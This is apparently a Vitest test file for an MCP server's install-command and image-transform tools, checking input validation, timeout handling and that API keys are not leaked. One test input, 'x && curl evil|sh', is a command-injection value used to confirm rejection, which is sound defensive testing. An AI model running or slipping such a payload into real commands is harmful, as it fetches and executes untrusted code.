import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { CallToolRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { registerTools } from './register-tools.js';

type ToolResult = { content: Array<{ type: string; text: string }>; isError?: boolean };
let callTool: (req: { params: { name: string; arguments: Record<string, unknown> } }) => Promise<ToolResult>;
const fetchMock = vi.fn();
beforeEach(() => {
  vi.stubEnv('UPLOADKIT_API_KEY', 'uk_live_test');
  vi.stubGlobal('fetch', fetchMock);
  fetchMock.mockReset();
  registerTools({ setRequestHandler(schema: unknown, handler: typeof callTool) {
    if (schema === CallToolRequestSchema) callTool = handler;
  } } as unknown as Server);
});
afterEach(() => { vi.unstubAllGlobals(); vi.unstubAllEnvs(); vi.restoreAllMocks(); });
const transform = () => callTool({ params: { name: 'transform_image', arguments: { key: 'image.png', width: 100 } } });

describe('get_install_command', () => {
  it.each([
    { packages: ['x && curl evil|sh'] },
    { packages: ['@uploadkitdev/react\n'] },
    { packages: 'not-an-array' },
    { packages: [] },
    { packageManager: 'unknown' },
  ])('returns a tool error for invalid runtime arguments %j', async (args) => {
    const result = await callTool({ params: { name: 'get_install_command', arguments: args } });
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).not.toContain('curl');
  });
  it('keeps the default install command', async () => {
    const result = await callTool({ params: { name: 'get_install_command', arguments: {} } });
    expect(result.content[0]?.text).toBe('pnpm add @uploadkitdev/react @uploadkitdev/next');
  });
});

describe('transform_image', () => {
  it('bounds the request and reports timeout as a readable tool error', async () => {
    const signal = AbortSignal.abort(new DOMException('Timeout', 'TimeoutError'));
    const timeout = vi.spyOn(AbortSignal, 'timeout').mockReturnValue(signal);
    fetchMock.mockImplementation(async (_url, init) => {
      if (init.signal) throw init.signal.reason;
      return new Response('{}');
    });
    const result = await transform();
    expect(timeout).toHaveBeenCalledWith(30_000);
    expect(fetchMock.mock.calls[0]?.[1].signal).toBe(signal);
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toMatch(/timed out/i);
  });
  it('reports non-JSON responses without throwing or echoing response bodies', async () => {
    fetchMock.mockResolvedValue(new Response('<html>private upstream info</html>', { status: 502 }));
    const result = await transform();
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toMatch(/502.*invalid JSON/i);
    expect(result.content[0]?.text).not.toContain('private upstream');
  });
  it('reports timeout while consuming the response body', async () => {
    const signal = AbortSignal.abort(new DOMException('Timeout', 'TimeoutError'));
    vi.spyOn(AbortSignal, 'timeout').mockReturnValue(signal);
    fetchMock.mockResolvedValue({ status: 200, ok: true, json: async () => { throw signal.reason; } });
    const result = await transform();
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toMatch(/timed out/i);
  });
  it('preserves valid success responses', async () => {
    fetchMock.mockResolvedValue(Response.json({ url: 'https://cdn.uploadkit.dev/image' }));
    expect(JSON.parse((await transform()).content[0]!.text)).toEqual({ url: 'https://cdn.uploadkit.dev/image' });
  });
  it('reports network failure without leaking the API key', async () => {
    fetchMock.mockRejectedValue(new Error('uk_live_test private detail'));
    const result = await transform();
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toMatch(/request failed/i);
    expect(result.content[0]?.text).not.toContain('uk_live_test');
  });
  it('preserves API failure details for valid JSON responses', async () => {
    fetchMock.mockResolvedValue(Response.json({ error: 'Quota exceeded' }, { status: 429 }));
    const result = await transform();
    expect(result.content[0]?.text).toMatch(/429.*Quota exceeded/);
  });
});
